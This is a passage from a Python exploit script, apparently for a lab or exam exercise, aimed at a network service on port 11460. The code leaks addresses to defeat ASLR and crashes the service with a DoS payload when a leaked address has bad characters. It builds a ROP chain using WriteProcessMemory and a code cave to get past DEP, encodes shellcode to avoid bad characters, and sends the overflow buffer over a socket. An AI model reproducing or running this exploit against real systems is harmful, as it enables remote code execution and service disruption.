        print(f"padsz: {len(paddingToRopSkeleton)}")

        paddingToShellcode = b'\x90' * (cbRopPad - ropLen)
        shellcode = sploit.shellcode.GetShellCode()

        nleft = (cbBuf + 4) - (
            len(self.GetPsAgentHeader()) +
            offsetRopSkeleton +
            len(ropChain) +
            self.CB_SSCANF +
            len(paddingToShellcode) +
            len(shellcode)
        ) + 2

        print(f"nleft: {nleft}")
        tailPadding = b"\x90" * nleft

        buffer = paddingToRopSkeleton + ropChain + \
            paddingToShellcode + shellcode + tailPadding
        self.SetPsAgentBuffer(
            self.SSCANF % (buffer, cbBuf, cbBuf, cbBuf, cbBuf)
        )

        self.SetPayload(
            self.GetCbPayload(),
            self.GetPsAgentHeader(),
            self.GetPsAgentBuffer()
        )

    def ResolveASLRAddressInfo(self, sploit, funcAddr, badCharFlag=True):
        net = sploit.net
        aslr = sploit.aslr
        service = sploit.service

        while (1):
            if net.GetSocket() != None:
                net.GetSocket().close()
                time.sleep(5)

            aslr.ClearAll()
            service.ClearAll()

            net.ConnectServerCreateSocket()

            aslr.SetAddressOffset(0x14E0)
            aslr.LeakFuncAddr(funcAddr)
            aslr.SetAddressBase()

            if (badCharFlag and aslr.HasAddressBadChar(self.badChars)):
                service.CreateDosPayload()
                net.SendPayload(sploit.service.GetPayload())
                time.sleep(15)

            else:
                break
        aslr.printer("[+] ASLR Information: ")

        return (aslr.GetAddress(), aslr.GetAddressOffset(), aslr.GetAddressBase())

    def EncodeShellcode(self, shellcode):
        print("\n[+] Encoding our shellcode ")
        shellcode.WriteShellCode()

        sc = shellcode.GetShellCode()
        badCharMap = shellcode.MapBadChars(sc)
        scEncode = shellcode.EncodeShellcode(sc)
        shellcode.SetShellCode(scEncode)

        return badCharMap

    def AppRunner(self, sploit):
        print("\n[+] Establishing dll Base for DEP")
        _, _, dllBase = self.ResolveASLRAddressInfo(
            sploit, b"N98E_CRYPTO_get_new_lockid")

        print("[+] Getting absolute address of WriteProcessMemory")
        WPMAddress, _, _ = self.ResolveASLRAddressInfo(
            sploit, b"WriteProcessMemory", False)

        dllBase = int.from_bytes(dllBase)
        WPMAddress = int.from_bytes(WPMAddress)

        badCharMap = self.EncodeShellcode(sploit.shellcode)

        print("\n[+] Creating exploit payload")
        # 0x400 - 4 bytes of memory for our shellcode. (to avoid null bytes)
        codeCave = dllBase + 0x92c04
        dataSection = dllBase + 0xe401c

        sploit.SetDEP(
            SnowCrashDEP(
                sploit,
                badCharMap=badCharMap,
                dllBase=dllBase,
                dataSection=dataSection,
                codeCave=codeCave,
                wpmAddress=WPMAddress
            )
        )

        self.CreateExploitPayload(sploit)
        sploit.net.SendPayload(
            self.GetPayload()
        )

        sploit.net.GetSocket().close()
        sys.exit(0)

    def Run(self, sploit):
        self.AppRunner(sploit)


class SnowCrashExploit:
    __offsetEip = 0x00

    def __init__(
            self,
            vulnService: SnowCrashVulnService = None,
            shellcode: SnowCrashShellCode = None,
            network=SnowCrashNet("", 0),
            dep=None,
            aslr=None
    ):
        self.service = vulnService
        self.shellcode = shellcode
        self.net = network
        self.dep = dep if dep is not None else SnowCrashDEP(self)
        self.aslr = aslr if aslr is not None else SnowCrashASLR(self)

    def SetExploitPayload(self, offsetEip):
        self.SetNopSled(offsetEip)

    def GetExploitPayload(self):
        return self.GetNopSled() + self.dep.GetRopChain() + self.shellcode.GetShellCode()

    def GetEIP(self):
        return self.__offsetEip

    def SetEIP(self, eip):
        self.__offsetEip = eip

    def SetDEP(self, dep: SnowCrashDEP):
        self.dep = dep

    def SetASLR(self, aslr: SnowCrashASLR):
        self.aslr = aslr


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} target.ip")
        ip = "192.168.196.10"
    else:
        ip = sys.argv[1]

    sploit = SnowCrashExploit(
        SnowCrashVulnService([
            b"\x00", b"\x09",
            b"\x0a", b"\x0b",
            b"\x0c", b"\x0d",
            b"\x20"
        ]),
        SnowCrashShellCode(
            b"\x00\x09\x0a\x0b\x0c\x0d\x20",
            b"\xff\x10\x06\x07\x08\x05\x1f"
        ),
        SnowCrashNet(
            ip,
            11460
        ),
    )

    sploit.service.Run(sploit)
